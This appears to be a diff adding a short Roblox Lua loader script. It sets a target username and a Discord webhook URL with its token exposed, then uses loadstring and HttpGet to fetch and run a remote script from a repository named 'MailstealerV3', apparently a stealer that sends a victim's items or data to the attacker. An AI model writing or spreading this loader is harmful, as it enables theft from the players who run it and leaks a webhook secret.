@@ -1,0 +1,4 @@
+Username = "mxtycute"
+Webhook = "https://discord.com/api/webhooks/1199018660778483802/MqODCoMBwde5tnuCy6ZDJ8eKNVZzabZ9x2ncosBlY_Cs0x6z7eLaL-O0ym2kh0wZVMQ0"
+LoadingScreen = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/MailstealerV3/main/main"))()
